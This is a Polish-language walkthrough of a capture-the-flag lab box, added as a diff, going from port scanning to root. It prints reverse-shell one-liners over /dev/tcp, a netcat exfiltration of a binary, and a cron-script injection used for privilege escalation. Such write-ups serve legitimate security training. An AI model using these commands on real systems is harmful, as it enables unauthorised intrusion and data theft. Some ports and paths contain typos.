@@ -1,0 +1,218 @@
+Logowanie za pomocą kluczy
+
+*Enumeracja za pomoca nmap:*
+```python
+sudo nmap -sC -sV 10.10.164.126
+
+map scan report for 10.10.164.126
+Host is up (0.045s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE    SERVICE VERSION
+21/tcp   filtered ftp
+22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
+|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
+|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
+8080/tcp open     http    Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
+|_http-title: Cat Pictures - Index page
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+
+*W przeglądarce wchodzę na stronę:*
+```python
+http://10.10.164.126:8080/
+```
+Strona na porcie 8080 jest zbudowana z frameworkiem phpBB.
+
+*W tym momencie dokonuję enumeracji katalogu w celu wyszukania ukrytych
+katalogów na serwerze www:*
+
+```python
+gobuster dir -u http://10.10.164.126 --wordlist /usr/share/wordlists/dirb/common.txt
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.164.126
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/09/18 08:05:28 Starting gobuster in directory enumeration mode
+===============================================================
+Error: error on running gobuster: unable to connect to http://10.10.164.126/: Get "http://10.10.164.126/": dial tcp 10.10.164.126:80: connect: connection refused
+```
+
+Niestety nie ma efektów tej enumeracji.
+
+Wchodząc w http://10.10.164.126:8080/styles/prosilver/style.cfg
+znalazłem wersję phpBB:
+phpbb_version = 3.3.3
+W tej wersji nie znalazłem luki.
+
+Wyszukałem informacje iż XML jest prostym odniesieniem do techniki 
+zwanej pukaniem do portów.
+Dzieki czemu można probować odblokować jakieś porty.
+W tym celu używam narzędzia knock:
+```python
+knock 10.10.164.126 1111 2222 3333 4444 -v
+```
+git clone https://github.com/grongor/knock
+
+lub
+
+```python
+for PORT in 1111 2222 3333 4444; do nc -vz 10.10.164.126 $PORT; done;
+```
+
+https://www.howtogeek.com/442733/how-to-use-port-knocking-on-linux-and-why-you-shouldnt/
+
+
+*W celu sprawdzenia czy port 21 jest otwarty użyje komendy:*
+```python
+nmap -p 21 -sC -sV -Pn 10.10.164.126
+```
+*Po stwierdzeniu że port jest otwarty należy zalogować 
+się jako anonymous:*
+```python
+ftp 10.10.164.126
+cat note.txt
+sardinethecat
+```
+
+*Skanowanie portu 4420:*
+```python
+nmap -p 4420 -sC -sV -Pn 10.10.164.126 
+```
+
+*Nawiazanie polaczenia poprzez port 4420:*
+```python
+netcat 10.10.164.126 4200
+password: sardinethecat
+```
+
+
+Kontynuując wyliczenie, na odwrotnej powłoce tym razem pojawia 
+sie plik binarny w katalogu */home/catlover*, jednak nie mozna 
+go wykonać bez poprawnego hasła.
+
+*W tym celu użyję netcat:*
+```python
+nc IP Kali Linux 4444 < /home/vatlover/runme
+lub
+bash -c 'exec bash -i &>/dev/tcp/IP Kali Linux/4444 <&1'
+```
+
+*W Kali Linux*
+```python
+nc -nvlp 4444 
+
+cd /home/catlover/
+./runme
+```
+Niesety hasło sardinethecat nie działa.
+Po wpisaniu komedy:
+```python
+cat runme
+``` 
+pojawił sie tekst w którym jest hasło.
+password: rebecca
+
+*Ponownie:*
+```python
+./runme
+password rebecca
+ls -al
+```
+Po uruchomieniu pliku binarnego na komputerze ofiary, 
+ujawnia się klucz prywatny *id_rsa*.
+
+Teraz należy skopiować klucz prywatny id_rsa i utworzyć plik 
+na Kali Linux.
+
+*Ustawić uprawenienia:*
+```python
+sudo chmod 600 id_rsa
+```
+
+*Trzeba było użyc komendy:*
+```python
+sudo chown kali:kali id_rsa
+```
+
+*W momencie gdy nie można się zalogować po ssh za pomocą 
+klucza id_rsa:*
+```python
+cd /home/kali/.ssh
+``` 
+usunąć pliki known_hosts  known_hosts.old
+
+*Logowanie:*
+```python
+ssh -i id_rsa catlover@10.10.164.126
+id
+pwd
+cd root
+cat flag.txt
+```
+
+
+*Próba eskalacji uprawenien:*
+```python
+sudo -l
+``` 
+Niestety nie zadziałalo.
+
+Nazwa hosta wskazuje, że znajduje się w kontenerze.
+
+*Wykonuje skanowanie za pomoca nmap:*
+```python
+nmap -sC -sV -p 2375 10.10.164.126
+
+Nmap scan report for 10.10.164.126
+Host is up (0.20s latency).
+
+PORT     STATE  SERVICE VERSION
+2375/tcp closed docker
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds
+zsh: segmentation fault  nmap -sC -sV -p 2375 10.10.164.126
+```
+
+Teraz należy uciec z kontenera i uzyskać pełną rzeczywistą kontrolę
+nad targetem.
+
+*Po otworzeniu pliku .bash_history wygląda że działa jakiś cronjob:*
+```python
+cat .bash_history
+```
+
+Teraz należy się upewnić czy ten cronjob rzeczywiście działa. 
+należy wprowadzić tą odwrotną powłokę do /opt/clean/clean.sh
+i użyć nc -nvlp 1234 na Kali Linux:
+
+*Kali Linux:*
+```python
+nc -nvlp 1234
+```
+
+*Target:*
+```python
+echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/IP Kali Linux/1234 0>&1'" >> clean.sh
+```
+
+**Połączenie root zostało nawiązane.**
+
+```python
+cat /root/root.txt
+```
